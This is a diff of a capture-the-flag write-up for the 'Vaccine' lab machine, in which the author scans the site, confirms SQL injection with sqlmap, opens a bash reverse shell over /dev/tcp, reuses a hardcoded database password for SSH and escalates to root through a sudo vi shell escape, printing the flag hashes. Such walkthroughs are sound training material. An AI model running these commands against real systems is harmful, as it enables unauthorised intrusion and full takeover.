@@ -4435,6 +4435,65 @@ Starting nikto scan
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Cookie PHPSESSID created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ 7926 requests: 3 error(s) and 6 item(s) reported on remote host
++ End Time:           2022-07-30 18:23:42 (GMT-4) (851 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+Finished nikto scan
+                                                                                                                                                                  
+=========================
+                                                                                                                                                                  
+Starting ffuf scan
+                                                                                                                                                                  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.187.99:80/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 77ms]
+.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 77ms]
+.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4215ms]
+.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4153ms]
+                        [Status: 200, Size: 2312, Words: 254, Lines: 44, Duration: 4154ms]
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4150ms]
+.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4152ms]
+.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5157ms]
+dashboard.php           [Status: 302, Size: 931, Words: 116, Lines: 34, Duration: 131ms]
+index.php               [Status: 200, Size: 2312, Words: 254, Lines: 44, Duration: 78ms]
+index.php               [Status: 200, Size: 2312, Words: 254, Lines: 44, Duration: 100ms]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 73ms]
+:: Progress: [9228/9228] :: Job [1/1] :: 390 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
+
+Finished ffuf scan
+                                                                                                                                                                  
+=========================
+                                                                                                                                                                  
+                                                                                                                                                                  
+                                                                                                                                             
+---------------------Finished all scans------------------------        
+
 ```
 
 We can see here our scan revealed a number of outstanding issues. We have a webserver, FTP, and SSH services running.
@@ -4608,9 +4667,21 @@ We can can now make use of them and try them in an alternative service. Loading 
 
 ![Screenshot_2022-07-30_19_21_34](https://user-images.githubusercontent.com/59018247/182003349-36a91b6e-ad5c-4cc8-aa31-38e11f2f9a24.png)
 
+Using our username/password combo, we successfully break in:
 
 ![Screenshot_2022-07-31_08_27_33](https://user-images.githubusercontent.com/59018247/182026361-5034b09d-592d-4fe0-920d-624da8934d6c.png)
 
+We can see the website is using a database backend to store information to a table. We can look at injection tools to help use find vulnerabilies for this input field.
+
+A great tool to try first is sqlmap, we can pass along the url to the search alond with our browser cookie ID:
+
+```
+URL: http://10.129.187.99/dashboard.php?search=any+query
+COOKIE SESSION: 2o765usoa104mdu0dkdc5h5rjh
+
+```
+Running the command:
+
 ```
 └─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh"
         ___
@@ -4676,71 +4747,9 @@ back-end DBMS: PostgreSQL
 [*] ending @ 19:39:17 /2022-07-30/
 
 ```
-```
-└─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh"
-        ___
-       __H__                                                                                                                                                     
- ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                         
-|_ -| . ["]     | .'| . |                                                                                                                                        
-|___|_  ["]_|_|_|__,|  _|                                                                                                                                        
-      |_|V...       |_|   https://sqlmap.org                                                                                                                     
+We discover the sqlmap has found a vulnerability! We can now re-run the command and use the ```--os-shell``` flag to give a shell:
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 19:37:52 /2022-07-30/
-
-[19:37:52] [INFO] testing connection to the target URL
-[19:37:52] [INFO] testing if the target URL content is stable
-[19:37:52] [INFO] target URL content is stable
-[19:37:52] [INFO] testing if GET parameter 'search' is dynamic
-[19:37:53] [WARNING] GET parameter 'search' does not appear to be dynamic
-[19:37:53] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
-[19:37:53] [INFO] testing for SQL injection on GET parameter 'search'
-it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
-for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
-[19:38:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[19:38:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[19:38:16] [INFO] testing 'Generic inline queries'
-[19:38:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
-[19:38:18] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
-[19:38:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[19:38:18] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
-[19:38:18] [INFO] testing 'PostgreSQL inline queries'
-[19:38:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
-[19:38:18] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                                                           
-[19:38:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
-[19:38:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
-[19:38:41] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
-[19:38:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
-sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
----
-Parameter: search (GET)
-    Type: boolean-based blind
-    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
-    Payload: search=any query' AND (SELECT (CASE WHEN (9821=9821) THEN NULL ELSE CAST((CHR(113)||CHR(97)||CHR(109)||CHR(120)) AS NUMERIC) END)) IS NULL-- kOWK
-
-    Type: error-based
-    Title: PostgreSQL AND error-based - WHERE or HAVING clause
-    Payload: search=any query' AND 9734=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9734=9734) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- xiVl
-
-    Type: stacked queries
-    Title: PostgreSQL > 8.1 stacked queries (comment)
-    Payload: search=any query';SELECT PG_SLEEP(5)--
-
-    Type: time-based blind
-    Title: PostgreSQL > 8.1 AND time-based blind
-    Payload: search=any query' AND 8587=(SELECT 8587 FROM PG_SLEEP(5))-- vMMM
----
-[19:39:16] [INFO] the back-end DBMS is PostgreSQL
-web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
-web application technology: Apache 2.4.41
-back-end DBMS: PostgreSQL
-[19:39:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.187.99'
-
-[*] ending @ 19:39:17 /2022-07-30/
-
-                                                                                                                                                                 
+```     
 ┌──(kali㉿kali)-[~]
 └─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh" --os-shell
         ___
@@ -4785,38 +4794,46 @@ back-end DBMS: PostgreSQL
 [19:42:05] [INFO] retrieved: '1'
 [19:42:05] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
 [19:42:05] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
 os-shell> 
 ```
+We have successfully accessed the shell! We can now use netcat to move the shell over to our host system:
 
 ```
 └─$ sudo nc -lvnp 443                                      
 [sudo] password for kali: 
 listening on [any] 443 ...
 ```
-
 ```
 os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.37/443 0>&1"
+
 do you want to retrieve the command standard output? [Y/n/a] y
 [19:45:48] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
 ```
-
 ```
 connect to [10.10.16.37] from (UNKNOWN) [10.129.187.99] 44046
 bash: cannot set terminal process group (4176): Inappropriate ioctl for device
 bash: no job control in this shell
+
 postgres@vaccine:/var/lib/postgresql/11/main$ 
 ```
+We have now been granted shell access on our machine with permissions of user postgress.
+
+In browsing around we notice our nineteenth flag!
+
 ```
 postgres@vaccine:/var/lib/postgresql$ cat user.txt
-cat user.txt
+
 ec9b13ca4d6229cd5cc1e09980965bf7
-postgres@vaccine:/var/lib/postgresql$ 
+
 ```
+Now would be a good time to try to escalate privileges to gain admin access. We can try searching the webserver files for more clues:
+
 ```
 postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
-cd /var/www/html
+
 postgres@vaccine:/var/www/html$ ls
-ls
+
 bg.png
 dashboard.css
 dashboard.js
@@ -4824,30 +4841,9 @@ dashboard.php
 index.php
 license.txt
 style.css
-postgres@vaccine:/var/www/html$ exit
-                                                                                                                                                                  
-┌──(kali㉿kali)-[~]
-└─$ sudo nc -lvnp 443
-listening on [any] 443 ...
-connect to [10.10.16.37] from (UNKNOWN) [10.129.187.99] 44446
-bash: cannot set terminal process group (4774): Inappropriate ioctl for device
-bash: no job control in this shell
-postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
-cd /var/www/html
-postgres@vaccine:/var/www/html$ ls
-ls
-bg.png
-dashboard.css
-dashboard.js
-dashboard.php
-index.php
-license.txt
-style.css
-postgres@vaccine:/var/www/html$ cat dashbboard.php
-cat dashbboard.php
-cat: dashbboard.php: No such file or directory
+                                                                                                                                
 postgres@vaccine:/var/www/html$ cat dashboard.php
-cat dashboard.php
+
 <!DOCTYPE html>
 <html lang="en" >
 <head>
@@ -4951,12 +4947,15 @@ cat dashboard.php
 </body>
 </html>
 ```
-
+Scanning the file, we notice an interesting line:
 ```
 "host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")
 ```
+We can try to use these credentials to log into SSH:
+
 ```
 └─$ ssh postgres@10.129.187.99
+
 The authenticity of host '10.129.187.99 (10.129.187.99)' can't be established.
 ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
 This key is not known by any other names
@@ -4995,6 +4994,7 @@ applicable law.
 
 postgres@vaccine:~$ 
 ```
+Logging in was a success! We upgraded to a more stable connection and we can now check out privileges:
 ```
 postgres@vaccine:~$ sudo -l
 [sudo] password for postgres: 
@@ -5006,21 +5006,37 @@ User postgres may run the following commands on vaccine:
     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
 postgres@vaccine:~$ 
 ```
+It appears we have been granted su access for the following commands ```/bin/vi /etc/postgresql/11/main/pg_hba.conf```:
 ```
 postgres@vaccine:~$ sudo /bin/vi
 Sorry, user postgres is not allowed to execute '/bin/vi' as root on vaccine.
 postgres@vaccine:~$ /etc/postgresql/11/main/pg_hba.conf
 ```
+Unfortunately, it won't allow us access. We can try to find a vi exploit where we can use that to get root access.
+
+In doing some digging, we find that an [exploit](https://gtfobins.github.io/gtfobins/vi/) can be done executing the following commands in vi:
+
+```
+:set shell=/bin/sh
+:shell
+```
+In doing so, we are finally presented with root access!
+
 ```
 # whoami 
+
 root
 # 
 ```
 ```
-# cd
 # ls
+
 pg_hba.conf  root.txt  snap
+
 # cat root.txt
+
 dd6e058e814260bc70e9bbdef2715849
 # 
 ```
+
+We uncovereed our twentieth flag.
